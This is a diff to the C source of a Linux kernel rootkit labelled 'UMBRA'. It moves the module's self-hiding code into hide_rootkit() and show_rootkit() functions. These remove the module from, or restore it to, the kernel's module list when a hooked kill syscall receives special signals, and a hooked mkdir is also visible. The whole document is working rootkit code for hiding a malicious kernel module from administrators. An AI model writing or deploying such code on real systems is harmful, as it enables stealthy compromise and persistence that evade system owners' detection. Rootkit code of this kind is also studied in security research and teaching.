@@ -21,10 +21,27 @@ asmlinkage int hook_mkdir(const struct pt_regs *regs){
     return 0;
 }
 
+
+
 //Keep track of whether the rootkit is hidden or not
 static int rootkit_visibility = 1;
 //Previous module on kernel module list, to remember the original position in case we remove it
 static struct list_head *prev_module;
+
+void hide_rootkit(void){
+    //Removing the rootkit from the linked list of modules maintained by the kernel
+    printk(KERN_INFO "UMBRA:: Module hidden.\n");
+    prev_module = THIS_MODULE->list.prev;
+    list_del(&THIS_MODULE->list);
+    rootkit_visibility = 0; //hidden
+}
+
+void show_rootkit(void){
+    //Adding the rootkit to the linked list of modules maintained by the kernel
+    printk(KERN_INFO "UMBRA:: Module visible.\n");
+    list_add(&THIS_MODULE->list, prev_module);
+    rootkit_visibility = 1;//visible
+}
 
 asmlinkage long (*orig_kill)(const struct pt_regs*);
 asmlinkage int hook_kill(const struct pt_regs *regs){
@@ -43,20 +60,13 @@ asmlinkage int hook_kill(const struct pt_regs *regs){
             printk(KERN_INFO "UMBRA:: Requested visibility, but already visible.\n");
             return orig_kill(regs);
         }
-        //Adding the rootkit to the linked list of modules maintained by the kernel
-        printk(KERN_INFO "UMBRA:: Module visible.\n");
-        list_add(&THIS_MODULE->list, prev_module);
-        rootkit_visibility = 1;//visible
+        show_rootkit();
     }else if(sig == SIGNAL_HIDE_KERNEL_MODULE){
         if(rootkit_visibility == 0){
             printk(KERN_INFO "UMBRA:: Requested hiding, but already hidden.\n");
             return orig_kill(regs);
         }
-        //Removing the rootkit from the linked list of modules maintained by the kernel
-        printk(KERN_INFO "UMBRA:: Module hidden.\n");
-        prev_module = THIS_MODULE->list.prev;
-        list_del(&THIS_MODULE->list);
-        rootkit_visibility = 0; //hidden
+        hide_rootkit();
     }
 
     return orig_kill(regs);
